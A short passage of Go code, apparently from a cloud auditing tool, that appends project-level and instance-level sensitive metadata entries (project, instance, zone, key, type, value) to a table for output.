				"PROJECT",
				"-",
				item.MetadataKey,
				item.Key,
				item.Type,
				item.Value,
			})
		}
	}

	// Add instance-level sensitive metadata
	for _, instance := range instances {
		if len(instance.SensitiveMetadata) > 0 {
			for _, item := range instance.SensitiveMetadata {
				body = append(body, []string{
					m.GetProjectName(instance.ProjectID),
					instance.Name,
					instance.Zone,
					item.MetadataKey,
					item.Key,
					item.Type,
					item.Value,
				})
			}
		}
	}

	return body
}
